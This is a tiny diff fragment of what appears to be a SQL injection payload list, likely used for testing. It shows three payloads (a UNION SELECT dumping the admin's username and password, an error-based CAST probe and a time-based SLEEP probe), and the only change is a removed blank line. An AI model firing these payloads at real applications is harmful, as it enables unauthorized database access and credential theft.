@@ -24,4 +24,3 @@
 ' UNION SELECT null, username, password FROM users WHERE username='admin' --
 ' OR 1=CAST('a' AS INT) --
 ' OR SLEEP(5) --
-
